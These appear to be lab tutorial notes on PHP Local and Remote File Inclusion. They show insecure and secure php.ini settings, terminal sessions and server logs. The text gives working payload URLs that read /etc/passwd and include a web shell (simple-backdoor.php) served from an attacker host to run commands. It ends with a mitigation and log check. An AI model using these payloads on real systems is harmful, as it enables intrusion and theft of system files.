Remote File Inclusion

**********************************************************************************************************************************

User editable input is used to include other files in execution flow
Input is not sanitized and can lead to arbitrary files being included by a malicious user
In PHP, include, include_once, require, require_once are responsible for File Inclusions

**********************************************************************************************************************************

Basic Remote File Inclusion

Insecure configuration
allow_url_include = On
root@kali:/var/www/rfi# nano /etc/php5/apache2/php.ini
root@kali:/var/www/rfi# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/rfi#

Local File Inclusion
http://localhost/rfi/rfi.php
http://localhost/rfi/rfi.php?file=home.php
http://localhost/rfi/rfi.php?file=contact.php
http://localhost/rfi/rfi.php?file=/etc/passwd

root@kali:~/Desktop# mkdir rfi
root@kali:~/Desktop# ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:c4:89:63
          inet addr:192.168.2.19  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fec4:8963/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:188534 errors:0 dropped:0 overruns:0 frame:0
          TX packets:82752 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:12819573 (12.2 MiB)  TX bytes:18907799 (18.0 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1532 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1532 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:310495 (303.2 KiB)  TX bytes:310495 (303.2 KiB)

root@kali:~/Desktop# cp /usr/share/webshells/php/simple-backdoor.php rfi/
root@kali:~/Desktop# cd rfi/
root@kali:~/Desktop/rfi# ls
simple-backdoor.php
root@kali:~/Desktop/rfi# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.2.19 - - [29/Oct/2015 20:08:16] "GET /simple-backdoor.php HTTP/1.0" 200 -
192.168.2.19 - - [29/Oct/2015 20:08:42] code 400, message Bad request syntax ('GET /simple-backdoor.php?cmd=cat /etc/passwd HTTP/1.0')
192.168.2.19 - - [29/Oct/2015 20:08:42] "GET /simple-backdoor.php?cmd=cat /etc/passwd HTTP/1.0" 400 -
192.168.2.19 - - [29/Oct/2015 20:08:48] code 400, message Bad request syntax ('GET /simple-backdoor.php7cmd=cat /etc/passwd HTTP/1.0')
192.168.2.19 - - [29/Oct/2015 20:08:48] "GET /simple-backdoor.php7cmd=cat /etc/passwd HTTP/1.0" 400 -
192.168.2.19 - - [29/Oct/2015 20:08:53] "GET /simple-backdoor.php HTTP/1.0" 200 -

Remote File Inclusion
http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php
Replace ? with &
http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=cat+/etc/passwd
http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=pwd

Secure configuration
allow_url_include = Off
root@kali:/var/www/rfi# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/rfi#

Monitor error logs
root@kali:/var/www/rfi# tail -f /var/log/apache2/error.log -n 0
[Thu Oct 29 20:13:45 2015] [error] [client 127.0.0.1] PHP Warning:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/rfi/rfi.php on line 5
[Thu Oct 29 20:13:45 2015] [error] [client 127.0.0.1] PHP Warning:  include(http://192.168.2.19:8000/simple-backdoor.php): failed to open stream: no suitable wrapper could be found in /var/www/rfi/rfi.php on line 5
[Thu Oct 29 20:13:45 2015] [error] [client 127.0.0.1] PHP Warning:  include(): Failed opening 'http://192.168.2.19:8000/simple-backdoor.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/rfi/rfi.php on line 5

http://localhost/rfi/rfi.php?file=http://192.168.2.19:8000/simple-backdoor.php&cmd=pwd
Doesnt work
http://localhost/rfi/rfi.php?file=/etc/passwd
Works

**********************************************************************************************************************************
